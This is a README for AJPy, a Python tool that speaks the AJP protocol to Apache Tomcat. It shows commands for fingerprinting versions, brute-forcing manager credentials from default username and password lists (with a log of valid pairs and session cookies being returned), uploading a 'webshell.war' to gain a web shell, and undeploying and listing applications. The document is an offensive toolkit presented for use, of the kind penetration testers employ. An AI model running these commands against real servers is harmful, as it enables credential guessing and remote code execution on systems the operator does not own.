# Intro

AJPy aims to craft AJP requests in order to communicate with AJP connectors.

Reference documentation: https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html

# Tools

At the moment, only one tool is provided for Tomcat with the following modules:

* version fingerprint
```
$ python tomcat.py version 172.17.0.2
Apache Tomcat/8.0.35
```

* authentication bruteforce
```
$ python tomcat.py -v  bf -U tomcat_mgr_default_users.txt -P tomcat_mgr_default_pass.txt /manager/html 172.17.0.2
[2016-06-10 17:24:55.965] INFO     Attacking a tomcat at ajp13://172.17.0.2:8009/manager/html
[2016-06-10 17:24:56.017] DEBUG    testing admin:admin
[2016-06-10 17:24:56.069] INFO     Found valid credz: admin:admin
[2016-06-10 17:24:56.069] INFO     Here is your cookie: JSESSIONID=1267BE97BFB5BFAEAFAAD76EE648FE06; Path=/manager/; HttpOnly
[2016-06-10 17:24:56.069] DEBUG    testing admin:manager
[2016-06-10 17:24:56.152] DEBUG    testing admin:role1
[2016-06-10 17:24:56.154] DEBUG    testing admin:root
[2016-06-10 17:24:56.155] DEBUG    testing admin:tomcat
[2016-06-10 17:24:56.157] DEBUG    testing manager:admin
[2016-06-10 17:24:56.158] DEBUG    testing manager:manager
[2016-06-10 17:24:56.159] DEBUG    testing manager:role1
[2016-06-10 17:24:56.160] DEBUG    testing manager:root
[2016-06-10 17:24:56.161] DEBUG    testing manager:tomcat
[2016-06-10 17:24:56.164] DEBUG    testing role1:admin
[2016-06-10 17:24:56.164] DEBUG    testing role1:manager
[2016-06-10 17:24:56.165] DEBUG    testing role1:role1
[2016-06-10 17:24:56.166] DEBUG    testing role1:root
[2016-06-10 17:24:56.167] DEBUG    testing role1:tomcat
[2016-06-10 17:24:56.169] DEBUG    testing root:admin
[2016-06-10 17:24:56.170] DEBUG    testing root:manager
[2016-06-10 17:24:56.171] DEBUG    testing root:role1
[2016-06-10 17:24:56.172] DEBUG    testing root:root
[2016-06-10 17:24:56.173] DEBUG    testing root:tomcat
[2016-06-10 17:24:56.175] DEBUG    testing tomcat:admin
[2016-06-10 17:24:56.175] DEBUG    testing tomcat:manager
[2016-06-10 17:24:56.176] DEBUG    testing tomcat:role1
[2016-06-10 17:24:56.177] DEBUG    testing tomcat:root
[2016-06-10 17:24:56.178] DEBUG    testing tomcat:tomcat
[2016-06-10 17:24:56.184] INFO     Found valid credz: tomcat:tomcat
[2016-06-10 17:24:56.184] INFO     Here is your cookie: JSESSIONID=9944126F31E428B8847AFEBF2307BB09; Path=/manager/; HttpOnly
[2016-06-10 17:24:56.184] DEBUG    testing tomcat:sstic2016
[2016-06-10 17:24:56.186] DEBUG    testing both:admin
[2016-06-10 17:24:56.187] DEBUG    testing both:manager
[2016-06-10 17:24:56.188] DEBUG    testing both:role1
[2016-06-10 17:24:56.189] DEBUG    testing both:root
[2016-06-10 17:24:56.190] DEBUG    testing both:tomcat
[2016-06-10 17:24:56.191] DEBUG    Closing socket...
```

* WAR upload
```
$ python tomcat.py upload -u tomcat -p tomcat webshell.war 172.17.0.2
```

* WAR undeploy
```
$ python tomcat.py undeploy -u tomcat -p tomcat /webshell 172.17.0.2
```

* Application listing
```
$ python tomcat.py list -u tomcat -p tomcat 172.17.0.2
```


# Thanks
* @MrTchuss for the Tomcat WAR upload fix
* @kalidor for the Tomcat WAR undeploy and application listing
